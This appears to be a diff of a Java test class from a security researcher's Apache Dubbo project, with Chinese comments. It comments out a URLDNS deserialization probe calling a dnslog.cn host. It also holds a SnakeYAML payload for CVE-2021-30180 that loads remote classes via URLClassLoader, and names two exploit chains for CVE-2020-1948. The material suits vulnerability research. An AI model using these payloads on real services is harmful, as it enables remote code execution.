@@ -17,7 +17,7 @@ import java.util.Random;
 
 public class MainConsumer {
     public static void main(String[] args) throws Exception {
-
+//        ###############正经的远程方法调用
 //        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
 //        context.start();
 //        RpcContext.getContext().setAttachment("dubbo.tag", "admintesssssssss");
@@ -28,28 +28,30 @@ public class MainConsumer {
 //        String name = int.class.getName();
 //        System.out.println(name);
 
-        URL url = new URL("http://c80hvr.dnslog.cn");
-        Field hashcode = Class.forName("java.net.URL").getDeclaredField("hashCode");
-        hashcode.setAccessible(true);
-        hashcode.set(url, 0xdeadbeef);
-        HashMap<URL, String> objectObjectHashMap = new HashMap<>();
-        objectObjectHashMap.put(url, "test");
-        hashcode.set(url, -1);
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-        objectOutputStream.writeObject(objectObjectHashMap);
+//        #####################原生java序列化测试
+//        URL url = new URL("http://c80hvr.dnslog.cn");
+//        Field hashcode = Class.forName("java.net.URL").getDeclaredField("hashCode");
+//        hashcode.setAccessible(true);
+//        hashcode.set(url, 0xdeadbeef);
+//        HashMap<URL, String> objectObjectHashMap = new HashMap<>();
+//        objectObjectHashMap.put(url, "test");
+//        hashcode.set(url, -1);
+//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+//        objectOutputStream.writeObject(objectObjectHashMap);
+//
+//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
+//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+//        objectInputStream.readObject();
 
-        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
-        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
-        objectInputStream.readObject();
-
-
+//        ##################  Apache Dubbo YAML 反序列化漏洞(CVE-2021-30180) 可以用这个payload，具体操作尚不清楚
 //        String payload = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://trrrest114455.hls8dx.dnslog.cn']]]]";
 //        Yaml yaml = new Yaml();
 //        yaml.load(payload);
 
 
     }
+//        Apache Dubbo 反序列化代码执行（CVE-2020-1948） 两条不同的利用链
 //        byte[] payloadByJdbc = SerializeByJdbcRowSetImpl.createPayload();
 //        byte[] payloadBySpring = SerializeBySpringPartiallyComparableAdvisorHolder.createPayload();
 //
